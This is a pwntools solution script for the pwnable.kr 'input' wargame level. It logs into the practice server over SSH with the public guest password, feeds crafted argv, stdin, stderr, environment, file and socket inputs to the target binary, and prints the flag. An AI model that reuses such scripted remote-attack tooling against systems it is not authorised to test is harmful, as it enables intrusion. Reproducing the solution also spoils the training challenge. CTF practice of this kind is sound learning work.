#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwnable.kr --port 2222 --user input2 --pass guest --path input2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'input2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'input2'
password = args.PASSWORD or 'guest'
remote_path = 'input2'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

context.terminal = ["kitty"]


port = randint(1024, 65535)

argv = [b""] * 99
argv[ord("B")-1] = b"\x20\x0a\x0d"
argv[ord("C")-1] = str(port)

def force_stderr():
    os.dup2(0, 2)

if not args.LOCAL:
    shell.upload_data(b"\x00" * 4, "\n")
else:
    open("\x0a", "wb").write(b"\x00" * 4)

io = start(argv, env={b"\xde\xad\xbe\xef": b"\xca\xfe\xba\xbe"}, preexec_fn=force_stderr)

io.send(b"\x00\x0a\x00\xff")
io.send(b"\x00\x0a\x02\xff")

time.sleep(1)

if not args.LOCAL:
    s = shell.connect_remote("127.0.0.1", port)
else:
    s = socket.create_connection(("127.0.0.1", port))

s.send(b"\xde\xad\xbe\xef")

io.recvuntil(b"Stage 5 clear!\n")

success(f"flag = {term.text.bold_italic_yellow(io.recvline().strip().decode())}")
